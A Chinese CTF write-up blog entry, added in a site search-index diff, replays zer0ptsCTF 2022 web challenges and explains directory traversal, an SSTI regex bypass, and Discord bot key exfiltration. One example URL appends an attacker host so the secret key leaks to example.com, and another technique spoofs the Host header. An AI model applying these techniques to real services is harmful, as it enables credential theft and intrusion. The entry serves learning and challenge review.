@@ -17051,4 +17051,177 @@ result <span class="token operator">=</span> <span class="token string">""</span
         <tag>Java</tag>
       </tags>
   </entry>
+  <entry>
+    <title>zer0ptsCTF2022复现</title>
+    <url>/zer0ptsCTF2022%E5%A4%8D%E7%8E%B0.html</url>
+    <content><![CDATA[<h1 id="zer0ptsCTF2022复现"><a href="#zer0ptsCTF2022复现" class="headerlink" title="zer0ptsCTF2022复现"></a>zer0ptsCTF2022复现</h1><p>其实都在虎符坐牢，虎符做完牢之后zer0pts的比赛也就差不多结束了。。。<br>虎符四个web感觉有两个不怎么web，zer0pts六个web感觉也有一半不怎么web。。。<br>zer0pts当初还是我提议拉一个队打一下的拉着。。。对不起其他究极输出的师傅们。<br>然后最后一个小时简单的看了一下web题。一共六个web，一个签到，两个感觉不是很web的题，以及这两个不是很web的题被非预期之后的revenge，和一个完全没看不知道是个啥的题（说起来究极国际队也赛题被疯狂非预期了，并且这个赛题数量以及其和web的相关程度，感觉也没有比我们好很多。突然心里有点舒服了一点？）不过感觉他们还是影响力比我们大多了，并且他们常年举办比赛也很有经验，总之就是discord里看起来很热闹氛围很好呜呜（我现在才知道似乎discord和QQ群不一样发公告不要随便@全体。。。就丢在announcement里就行。。。以及现在的私聊比较流行的说法是dm，direct message）</p>
+<p>然后因为没有怎么看题所以不会坐牢，简单复现</p>
+<p>然后因为没有看多久所以简单看一下然后去codeql坐牢吧。。。</p>
+<h2 id="GitFile-Explorer"><a href="#GitFile-Explorer" class="headerlink" title="GitFile Explorer"></a>GitFile Explorer</h2><p>签到。是个人都能做。正则写的过于粗糙目录穿越一下即可<br><code>zer0pts&#123;foo/bar/../../../../../directory/traversal&#125;</code><br>如果把协议那里稍微写仔细一点感觉会难一点点点点</p>
+<h2 id="miniblog"><a href="#miniblog" class="headerlink" title="miniblog++"></a>miniblog++</h2><p>被非预期的web1<br>这个题预期解感觉和web的关系不大。。。</p>
+<p>但是非预期还是挺web的。以及叫做++不知道是不是往年有普通版</p>
+<p>代码非常的长，预期解是要打究极的zip协议再ssti。但由于在模板渲染处控制的不是很好结果就导致了直接的ssti打爆了。这里就简单的看一下这段吧</p>
+<p>修复前的代码</p>
+<pre class=" language-python"><code class="language-python">        <span class="token keyword">for</span> brace <span class="token keyword">in</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"{{.*?}}"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> <span class="token operator">not</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">"{{!?[a-zA-Z0-9_]+}}"</span><span class="token punctuation">,</span> brace<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">return</span> <span class="token string">'You can only use "{{title}}", "{{author}}", and "{{date}}"'</span><span class="token punctuation">,</span> None
+</code></pre>
+<p>修复后的代码</p>
+<pre class=" language-python"><code class="language-python">        <span class="token keyword">for</span> m <span class="token keyword">in</span> re<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span>r<span class="token string">"{{"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            p <span class="token operator">=</span> m<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token punctuation">(</span>content<span class="token punctuation">[</span>p<span class="token punctuation">:</span>p<span class="token operator">+</span>len<span class="token punctuation">(</span><span class="token string">'{{title}}'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'{{title}}'</span> <span class="token operator">or</span> \
+                    content<span class="token punctuation">[</span>p<span class="token punctuation">:</span>p<span class="token operator">+</span>len<span class="token punctuation">(</span><span class="token string">'{{author}}'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'{{author}}'</span> <span class="token operator">or</span> \
+                    content<span class="token punctuation">[</span>p<span class="token punctuation">:</span>p<span class="token operator">+</span>len<span class="token punctuation">(</span><span class="token string">'{{date}}'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'{{date}}'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">return</span> <span class="token string">'You can only use "{{title}}", "{{author}}", and "{{date}}"'</span><span class="token punctuation">,</span> None
+</code></pre>
+<p>修复前的代码使用正则表达式去匹配所有的双大括号，然后只支持a-zA-Z0-9和下划线，也就理论上来说防御了SQL注入。但这里有一个非常严重的问题，就是<code>.</code>不匹配换行。而ssti是可以换行的，通过换行ssti执行到rce成功</p>
+<p>修了一下之后直接字符串等于了，超级修复。他们两个题的revenge的附件压缩包密码都是上一题的flag，这样子的做好不好呢？说起来这样子也就可以直接在修复里暴露出上一题的解法了，但是他们还是换了一个方法来修复。写的很死应该是怕再出问题吧。。。（毕竟我们的题目修复之后还是有超级漏洞就很丢脸了。。。）</p>
+<h2 id="Disco-Party"><a href="#Disco-Party" class="headerlink" title="Disco Party"></a>Disco Party</h2><p>被非预期的web2，感觉预期解应该是什么discord的特性黑魔法<br>代码还挺长的。</p>
+<p>主要看这段</p>
+<pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/post/&lt;string(length=16):id>"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">get_post</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Read a ticket"""</span>
+    <span class="token comment" spellcheck="true"># Get ticket by ID</span>
+    content <span class="token operator">=</span> get_redis_conn<span class="token punctuation">(</span>DB_TICKET<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>id<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> content <span class="token keyword">is</span> None<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> <span class="token string">"not found"</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Check if admin</span>
+    content <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+    key <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>
+    is_admin <span class="token operator">=</span> isinstance<span class="token punctuation">(</span>key<span class="token punctuation">,</span> str<span class="token punctuation">)</span> <span class="token operator">and</span> get_key<span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token operator">==</span> key
+
+    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span>
+        <span class="token string">"index.html"</span><span class="token punctuation">,</span>
+        <span class="token operator">**</span>content<span class="token punctuation">,</span>
+        is_post<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
+        panel<span class="token operator">=</span>f<span class="token triple-quoted-string string">"""
+&lt;strong>Hello admin! Your flag is: {FLAG}&lt;/strong>&lt;br>
+&lt;form id="delete-form" method="post" action="/api/delete">
+    &lt;input name="id" type="hidden" value="{id}">
+    &lt;input name="key" type="hidden" value="{key}">
+    &lt;button id="modal-button-delete" type="button">Delete This Post&lt;/button>
+&lt;/form>
+"""</span> <span class="token keyword">if</span> is_admin <span class="token keyword">else</span> <span class="token string">""</span><span class="token punctuation">,</span>
+        url<span class="token operator">=</span>flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">,</span>
+        sitekey<span class="token operator">=</span>RECAPTCHA_SITE_KEY
+    <span class="token punctuation">)</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/api/new"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">api_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Create a new ticket"""</span>
+    <span class="token comment" spellcheck="true"># Get parameters</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        title <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"title"</span><span class="token punctuation">]</span>
+        content <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Invalid request"</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Register a new ticket</span>
+    id <span class="token operator">=</span> b64digest<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
+    get_redis_conn<span class="token punctuation">(</span>DB_TICKET<span class="token punctuation">)</span><span class="token punctuation">.</span>set<span class="token punctuation">(</span>
+        id<span class="token punctuation">,</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span> title<span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> content<span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"OK"</span><span class="token punctuation">,</span>
+                          <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Post created! Click here to see your post"</span><span class="token punctuation">,</span>
+                          <span class="token string">"action"</span><span class="token punctuation">:</span> f<span class="token string">"{flask.request.url_root}post/{id}"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/api/report"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">api_report</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Reoprt an invitation ticket"""</span>
+    <span class="token comment" spellcheck="true"># Get parameters</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        url <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span>
+        reason <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"reason"</span><span class="token punctuation">]</span>
+        recaptcha_token <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"g-recaptcha-response"</span><span class="token punctuation">]</span>
+    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Invalid request"</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Check reCAPTCHA</span>
+    score <span class="token operator">=</span> verify_recaptcha<span class="token punctuation">(</span>recaptcha_token<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> score <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Recaptcha verify failed"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> score <span class="token operator">&lt;=</span> <span class="token number">0.3</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> f<span class="token string">"Bye robot (score: {score})"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Check URL</span>
+    parsed <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> len<span class="token punctuation">(</span>parsed<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Query string is not allowed"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> f<span class="token string">'{parsed.scheme}://{parsed.netloc}/'</span> <span class="token operator">!=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url_root<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid host"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Parse path</span>
+    adapter <span class="token operator">=</span> app<span class="token punctuation">.</span>url_map<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>host<span class="token punctuation">)</span>
+    endpoint<span class="token punctuation">,</span> args <span class="token operator">=</span> adapter<span class="token punctuation">.</span>match<span class="token punctuation">(</span>parsed<span class="token punctuation">.</span>path<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> endpoint <span class="token operator">!=</span> <span class="token string">"get_post"</span> <span class="token operator">or</span> <span class="token string">"id"</span> <span class="token operator">not</span> <span class="token keyword">in</span> args<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid endpoint"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Check ID</span>
+    <span class="token keyword">if</span> <span class="token operator">not</span> get_redis_conn<span class="token punctuation">(</span>DB_TICKET<span class="token punctuation">)</span><span class="token punctuation">.</span>exists<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid ID"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    key <span class="token operator">=</span> get_key<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    message <span class="token operator">=</span> f<span class="token string">"URL: {url}?key={key}\nReason: {reason}"</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        get_redis_conn<span class="token punctuation">(</span>DB_BOT<span class="token punctuation">)</span><span class="token punctuation">.</span>rpush<span class="token punctuation">(</span>
+            <span class="token string">'report'</span><span class="token punctuation">,</span> message<span class="token punctuation">[</span><span class="token punctuation">:</span>MESSAGE_LENGTH_LIMIT<span class="token punctuation">]</span>
+        <span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Post failed"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"OK"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Successfully reported"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+</code></pre>
+<p>访问post时如果带有正确的key就能拿到flag</p>
+<p>bot会将message写进redis，然后再发送到某个秘密channel中。我们要做的就是获取到这个key。说起来前面这里的解析。这么大一堆。。。。看的不是很懂呢<br>大致就是检查了url必须是题目的url，然后不能带get参数，并且一定要访问的是get_post对应的路由，这里的这段写法我就觉得有点玄幻（直接字符串比较不就行了么）</p>
+<p>可以简单地观察到的情况是，当你在discord中发送一个链接的时候，discord是会请求这个链接的，然后在聊天框里出现一个preview</p>
+<h3 id="非预期1"><a href="#非预期1" class="headerlink" title="非预期1"></a>非预期1</h3><p>所以非预期解是在有效的一个post链接后面添加<code># &lt;vps&gt;</code>，由于题目没有检查hash字段，且最终是将整个url进行拼接，空格又打断了实际上发出去时的url判断，实际上就变成了将vps和后面的参数拼起来又发了一次<br>请求</p>
+<pre><code>http://party.ctf.zer0pts.com:8007/post/0123456789abcdef# http://example.com/
+</code></pre>
+<p>就会实际上将key发送到example.com</p>
+<h3 id="非预期2"><a href="#非预期2" class="headerlink" title="非预期2"></a>非预期2</h3><p>这里判断url使用的是flask.request.url_root和flask.request.host。而这两个值其实是基于请求的Host header的，只要修改host header就可以发送任意请求了</p>
+<p>这里写的这个bind再match的操作我还以为究极检测，结果就是把自己的urlmap对应起来进行比对，并不受host影响。因此修改host就可以提交任意url，同样的进行外带</p>
+<h2 id="Disco-Festival"><a href="#Disco-Festival" class="headerlink" title="Disco Festival"></a>Disco Festival</h2><p>这个题修了，把report处的代码改掉了<br>并且直接用字符串进行host的检查了，发送的链接也基本上被写死了</p>
+<p>一次修了两个问题，也很稳妥。。。不像我们修了一个又被非预期了，显得很呆。。。害</p>
+<pre class=" language-python"><code class="language-python">HOST <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"HOST"</span><span class="token punctuation">,</span> <span class="token string">"localhost"</span><span class="token punctuation">)</span>
+PORT <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"PORT"</span><span class="token punctuation">,</span> <span class="token string">"8017"</span><span class="token punctuation">)</span>
+NETLOC <span class="token operator">=</span> f<span class="token string">'{HOST}:{PORT}'</span>
+
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+    adapter <span class="token operator">=</span> app<span class="token punctuation">.</span>url_map<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>NETLOC<span class="token punctuation">)</span>
+    endpoint<span class="token punctuation">,</span> args <span class="token operator">=</span> adapter<span class="token punctuation">.</span>match<span class="token punctuation">(</span>parsed<span class="token punctuation">.</span>path<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> endpoint <span class="token operator">!=</span> <span class="token string">"get_post"</span> <span class="token operator">or</span> <span class="token string">"id"</span> <span class="token operator">not</span> <span class="token keyword">in</span> args<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid endpoint"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Check ID</span>
+    <span class="token keyword">if</span> <span class="token operator">not</span> get_redis_conn<span class="token punctuation">(</span>DB_TICKET<span class="token punctuation">)</span><span class="token punctuation">.</span>exists<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid ID"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    key <span class="token operator">=</span> get_key<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    message <span class="token operator">=</span> f<span class="token string">"URL: http://{NETLOC}{parsed.path}?key={key}\nReason: {reason}"</span>
+</code></pre>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>还是和之前发一个链接然后discord会去加载一下预览相关</p>
+<p>discord的链接预览似乎是存在着玄幻的全局缓存机制的，也就是说如果其他人在其他地方发了一个url，discord抓取了预览，那么这个预览就是全局的，在另一个服务器发送也会获取到该预览值。并且只要url的参数甚至hash不同，就会重新进行抓取</p>
+<p>通过这个操作进行xs leak</p>
+<p>report处限制了整个消息的长度，而adapter.match对于get_post的这个router<code>/post/&lt;string(length=16):id&gt;</code>的解析实际上也是转换到了正则<code>r&#39;^\|/+?post/+?(?P&lt;id&gt;[^/]&#123;16&#125;)$&#39;</code>。虽然后面半截看不懂，但是开局那个意思应该是允许出现很多斜杠</p>
+<p>因此使用大量的斜杠来截断消息。使bot发送类似<code>http://target///////////.../post/&lt;id&gt;?key=xx</code>的消息，这样子可以控制住发送出去的key的长度。从而逐位leak</p>
+<p>在bot发送了该链接后对字符集进行遍历，能够迅速得到预览的即为命中，可以使用discord bot消息中的embeds属性快速确认是否命中</p>
+<p><a href="https://hackmd.io/6J49ly7SSAC2pon0IDLxBg">官方wp</a></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>上次忘了什么原因升级了node和hexo，旧版本hexo遇到ssti这种双大括号是会解析错误疯狂报错的，今天发现新版本修了，并且原来的row和endrow标签反而又不能识别了。不过不用加这个玩意本身就是好事</p>
+]]></content>
+      <categories>
+        <category>刷题记录</category>
+      </categories>
+      <tags>
+        <tag>wp</tag>
+      </tags>
+  </entry>
 </search>
